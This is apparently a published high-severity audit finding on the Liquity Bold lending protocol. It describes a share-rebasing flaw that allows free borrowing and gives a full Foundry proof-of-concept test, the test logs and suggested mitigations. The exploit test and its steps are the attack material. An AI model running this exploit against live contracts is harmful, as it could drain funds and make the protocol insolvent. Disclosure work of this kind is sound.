---
tags:
  - lang/solidity
  - sector/cdp
  - sector/lending
  - sector/token
  - platform/recon-audits
  - has/github
  - severity/high
protocol: "[[Bold Report]]"
auditors:
  - Alex The Entreprenerd
report: "https://github.com/solodit/solodit_content/blob/main/reports/Recon Audits/2025-03-23-bold-report.md"
genome:
  - "[[token-decimal-normalization]]"
  - "[[specific-token-type]]"
---
# [H-01] Bold Batch Shares Math can be rebased by combining rounding errors and `setBatchManagerAnnualInterestRate` to borrow for free

- id: 53947
- impact: HIGH
- protocol: Bold Report
- reporter: Alex The Entreprenerd (Recon Audits)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Recon Audits/2025-03-23-bold-report.md

## Summary


This bug report discusses a finding in the Truncation based math used in the `_updateBatchShares` function. This, in combination with the ability to raise the value of a debt share via the `setBatchManagerAnnualInterestRate` function, allows for the rebase of shares to such a degree that the system becomes vulnerable to forgiving an entire Trove worth of debt. The report provides a proof of concept for this exploit and outlines its impact, which includes the ability to mint an infinite amount of currency at no cost to the attacker. To mitigate this issue, the report suggests rounding up the debt that each Trove must pay and introducing virtual shares to make rebasing impossible. Additionally, enforcing a minimum size for Trove operations can prevent this exploit from being practical.

## Details

**Executive Summary**

This finding is the culmination of  #41, #40 and #39

This finding demonstrates that the Truncation based math, used in `_updateBatchShares`, in combination with the ability to reliably raise the value of a debt share via `setBatchManagerAnnualInterestRate` allows to rebase the shares to such a degree that it will make the system subject to forgiving an Entire Trove worth of Debt

**Brief Proof Of Concept**

The debt of a Trove in a Batch is computed as follows:
https://github.com/liquity/bold/blob/a34960222df5061fa7c0213df5d20626adf3ecc4/contracts/src/TroveManager.sol#L932-L933

```solidity
            _latestTroveData.recordedDebt = _latestBatchData.recordedDebt * batchDebtShares / totalDebtShares;

```

The way the new shares is calculated when a Trove increases its debt is as follows:
https://github.com/liquity/bold/blob/a34960222df5061fa7c0213df5d20626adf3ecc4/contracts/src/TroveManager.sol#L1748-L1749

```solidity
                    batchDebtSharesDelta = currentBatchDebtShares * debtIncrease / _batchDebt;

```

The exploit uses the truncation in `batchDebtSharesDelta` and is fully explain in #39

**Impact**

From the preconditions described in #40, we do the following:
- Rebase the 1 share to have 100+ debt (we need a value that will result in debt growth when we charge the Batch Update Fee)
- Start charging upfront fees to it (which compound, hence they will grow faster than us abusing rounding errors)
- We need to spam `setBatchManagerAnnualInterestRate` on each block, until the 1 share is worth more than MIN_DEBT + Open fee of debt
- This can be achieved by calling `setBatchManagerAnnualInterestRate` `2355` times

The preconditions are pretty specific and can technically be blocked by anyone joining a specific Batch

However, the cost of the attack is zero, the attack can be setup by all actors at all times and the result of the attack is the ability to mint an infinite amount of bold a zero cost to the attacker, leading me to believe that this is a high severity impact that requires rethinking the Batch Shares math


**Complete Proof Of Concept**

The following POC chains all of the concepts above, as well as from #41 and #40 to perform free borrows that will cause the system to go underwater

```solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

import "./TestContracts/DevTestSetup.sol";

contract Redemptions is DevTestSetup {


    bool WITH_INTEREST = true; // Do we need to tick some interest to cause a rounding error?

    // forge test --match-test test_alex_batchRebaseToSystemInsolvency -vv
    function test_alex_batchRebaseToSystemInsolvency() public{
        // === EXTRA SETUP === //
        // Open Trove
        priceFeed.setPrice(2000e18);
        // Extra Debt (irrelevant / Used to not use deal)
        uint256 CTroveId = openTroveNoHints100pct(C, 100 ether, 100e21, MAX_ANNUAL_INTEREST_RATE);
        vm.startPrank(C);
        boldToken.transfer(A, boldToken.balanceOf(C));
        vm.stopPrank();


        // === 1: Setup Batch Rebase === ///

        // Open 2 troves so we get enough interest
        // 1 will be redeemed down to 1 wei
        uint256 ATroveId = openTroveAndJoinBatchManager(A, 100 ether, MIN_DEBT, B, MAX_ANNUAL_INTEREST_RATE);
        // Sock Puppet Trove | Opened second so we can redeem this one | We need to redeem this one so we can inflate the precision loss
        uint256 BTroveId = openTroveAndJoinBatchManager(B, 100 ether, MIN_DEBT, B, MAX_ANNUAL_INTEREST_RATE);


        // MUST accrue to rebase shares
        // Limit to one block so this attack is basically unavoidable
        if(WITH_INTEREST) {
            vm.warp(block.timestamp + 12);
        }


        LatestBatchData memory b4Batch = troveManager.getLatestBatchData(address(B));

        // TODO: Open A, Mint 1 extra (forgiven to A)
        _addOneDebtAndEnsureItDoesntMintShares(ATroveId, A); /// @audit MED impact

        LatestBatchData memory afterBatch = troveManager.getLatestBatchData(address(B));

        assertEq(b4Batch.entireDebtWithoutRedistribution + 1, afterBatch.entireDebtWithoutRedistribution, "Debt is credited to batch");
        
        // Closing A here will credit to B and Batch, that's ok but not enough
        LatestTroveData memory trove = troveManager.getLatestTroveData(BTroveId);
        uint256 bEntireDebtB4 = trove.entireDebt;

        vm.startPrank(A);
        collateralRegistry.redeemCollateral(bEntireDebtB4, 100, 1e18); // 2 debt, 1 share (hopefully)
        vm.stopPrank();

        uint256 sharesAfterRedeem = _getBatchDebtShares(BTroveId);
        assertEq(sharesAfterRedeem, 1, "Must be down to 1, rebased");

        // Let's have B get 1 share, 2 debt | Now it will be 1 | 1 because A is socializing that share
        LatestTroveData memory bAfterRedeem = troveManager.getLatestTroveData(BTroveId);
        assertEq(bAfterRedeem.entireDebt, 1, "Must be 1, Should be 2 for exploit"); // NOTE: it's one because of the division on total shares

        // Close A (also remove from batch is fine)
        closeTrove(A, ATroveId); 

        // Now B has rebased the Batch to 1 Share, 2 Debt
        LatestTroveData memory afterClose = troveManager.getLatestTroveData(BTroveId);
        assertEq(afterClose.entireDebt, 2, "Becomes 2"); // Note the debt becomes 2 here because of the round down on what A needs to repay

    
        // === 2: Rebase to 100+ === //
        // We need to rebase to above 100
        uint256 x;
        while(x++ < 100) {
            // Each iteration adds 1 wei of debt to the Batch, while leaving the Shares at 1
            _openCloseRemainderLoop(1, BTroveId);
        }

        _logTrovesAndBatch(B, BTroveId);

        // === 3: Compound gains === //
        // We can now spam
        // Each block, we will rebase the share by charging the upfrontFee
        // This endsup taking
        uint256 y;
        while(y < 2560) {
            _triggerInterestRateFee();
            y++;

            LatestTroveData memory troveData = troveManager.getLatestTroveData(BTroveId);
            // This flags that we can borrow for free
            if(troveData.entireDebt > 4000e18 + 1) {
                break;
            }
        }
        // 2391 blocks
        console2.log("We have more than 2X MIN_DEBT of rebase it took us blocks:", y);

        _logTrovesAndBatch(B, BTroveId);


        // === 4: Free Loans === //
        uint256 debtB4 = borrowerOperations.getEntireSystemDebt();
        // We can now open a new Trove
        uint256 anotherATroveId = openTroveAndJoinBatchManager(A, 100 ether, MIN_DEBT, B, MIN_ANNUAL_INTEREST_RATE);
        LatestTroveData memory anotherATrove = troveManager.getLatestTroveData(anotherATroveId);
        uint256 aDebt = anotherATrove.entireDebt;

        // It will pay zero debt
        assertEq(aDebt, 0, "Forgiven");

        uint256 balB4 = boldToken.balanceOf(A);
        closeTrove(A, anotherATroveId);
        uint256 balAfter = boldToken.balanceOf(A);

        // And we can repeat this to get free debt
        uint256 debtAfter = borrowerOperations.getEntireSystemDebt();

        assertEq(balB4, balAfter, "No thing was paid");
        assertGt(debtAfter, debtB4, "We got it for free");
    }
    
    uint128 subTractor = 1;

    // Trigger interest fee by changing the fee to it -1 
    function _triggerInterestRateFee() internal {
        // Add Fee?
        vm.warp(block.timestamp + 1);
        vm.startPrank(B);
        borrowerOperations.setBatchManagerAnnualInterestRate(1e18 - subTractor++, 0, 0, type(uint256).max);
        vm.stopPrank();
    }

    

    function _logTroveInBatch(uint256 troveId) internal {

        LatestTroveData memory troveData = troveManager.getLatestTroveData(troveId);
        console2.log("troveData debt", troveData.entireDebt);

        uint256 batchShares = _getBatchDebtShares(troveId);
        console2.log("batchShares", batchShares);
    }

    function _logTrovesAndBatch(address batch, uint256 troveB) internal {
        console2.log("");
        console2.log("_logTrovesAndBatch");
        // Log Batch Debt
        console2.log("_getLatestBatchDebt", _getLatestBatchDebt(batch));
        // Log all Batch shares
        console2.log("_getTotalBatchDebtShares", _getTotalBatchDebtShares(batch));

        _logTroveInBatch(troveB);
    }

    function _openCloseRemainderLoop(uint256 amt, uint256 BTroveId) internal {
        LatestTroveData memory troveBefore = troveManager.getLatestTroveData(BTroveId);

        // Open
        uint256 ATroveId = openTroveAndJoinBatchManager(A, 100 ether, MIN_DEBT, B, MAX_ANNUAL_INTEREST_RATE);
        
        LatestTroveData memory b4Add = troveManager.getLatestTroveData(ATroveId);

        // Add debt that wont' be credited (fibonacci)
        _addDebtAndEnsureItDoesntMintShares(ATroveId, A, amt); // TODO: Needs to be made to scale

        LatestTroveData memory afterAdd = troveManager.getLatestTroveData(ATroveId);


        closeTrove(A, ATroveId); // Close A (also remove from batch is fine)

        LatestTroveData memory troveAfter = troveManager.getLatestTroveData(BTroveId);
        assertGt(troveAfter.entireDebt, troveBefore.entireDebt, "we're rebasing");

    }

    function _addDebtAndEnsureItDoesntMintShares(uint256 troveId, address caller, uint256 amt) internal {
  (
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        uint256 b4BatchDebtShares
            ) = troveManager.Troves(troveId);

        withdrawBold100pct(caller, troveId, amt);

        (
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        uint256 afterBatchDebtShares
            ) = troveManager.Troves(troveId);
        
        assertEq(b4BatchDebtShares, afterBatchDebtShares, "Same Shares");
    }


    function _addOneDebtAndEnsureItDoesntMintShares(uint256 troveId, address caller) internal {
       _addDebtAndEnsureItDoesntMintShares(troveId, caller, 1);
    }

    function _getLatestRecordedDebt(address batch) internal returns (uint256) {
        LatestBatchData memory batchData = troveManager.getLatestBatchData(B);

        return batchData.recordedDebt;
    }

    function _getLatestBatchDebt(address batch) internal returns (uint256) {
        LatestBatchData memory batchData = troveManager.getLatestBatchData(B);

        return batchData.entireDebtWithoutRedistribution;
    }

    function _getBatchDebtShares(uint256 troveId) internal returns (uint256) {
        (
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        ,
        uint256 batchDebtShares
            ) = troveManager.Troves(troveId);

        return batchDebtShares;
    }

    function _getTotalBatchDebtShares(address batch) internal returns (uint256) {
        (,
        ,
        ,
        ,
        ,
        ,
        ,
        uint256 allBatchDebtShares) = troveManager.getBatch(batch);

        return allBatchDebtShares;
    }
}

```

And the logs will be:

```solidity
[PASS] test_alex_batchRebaseToSystemInsolvency() (gas: 179621534)
Logs:
  
  _logTrovesAndBatch
  _getLatestBatchDebt 102
  _getTotalBatchDebtShares 1
  troveData debt 102
  batchShares 1
  We have more than 2X MIN_DEBT of rebase it took us blocks: 2391
  
  _logTrovesAndBatch
  _getLatestBatchDebt 4047087525812145759563
  _getTotalBatchDebtShares 1
  troveData debt 4047087525812145759563
  batchShares 1
```


**Mitigation**

The issue stems from the ability to somewhat reliably rebase the shares in the Batch at effectively no cost to the attacker

The shares need to be rebased from "real" interest, and should not be allowed to be rebased by "fake" interest

I believe that a fix would require multiple components:

**1) Round up the debt that each Trove must pay, Round down it's contribution to debt being repaid**
This is a bit of a niche fix, but fundamentally, every Trove must pay it's fair share, so their debt must roundedUp
However, removing more than what they "actually" owe, would open up to a scenario in which some shares are worth 0, which can cause a permanent DOS due to division by zero

As such the math must over-charge (pay more debt) and under-deliver (reduce Batch debt by less)

**2) Introduce Virtual Shares**
Introducing Virtual Shares to a batch will mean that some of the interest will be paid (and lost) to shares that don't really exist

However, the behaviour is well documented (see Euler and Morpho audits)

Virtual Share make rebasing effectively impossible, they make it so that a 1 wei error can only be abused to cause another 1 wei error, which would require more than millions of iterations, a cost that is not really feasible

Setting a virtual share of 1e18 with a debt of 1e18 should be sufficient to prevent any rebase attack

**3) Enforce MIN_SIZE operations**
Do not allow a Trove having very low debt nor very low Batch shares

By enforcing that Troves always maintain certain size, you remove all the practicalities of the rebase exploit

As you can see in #41 once we have a sufficiently high number of shares, all operations error is reduced down to 1 wei

This makes rebase attacks too expensive to pull off
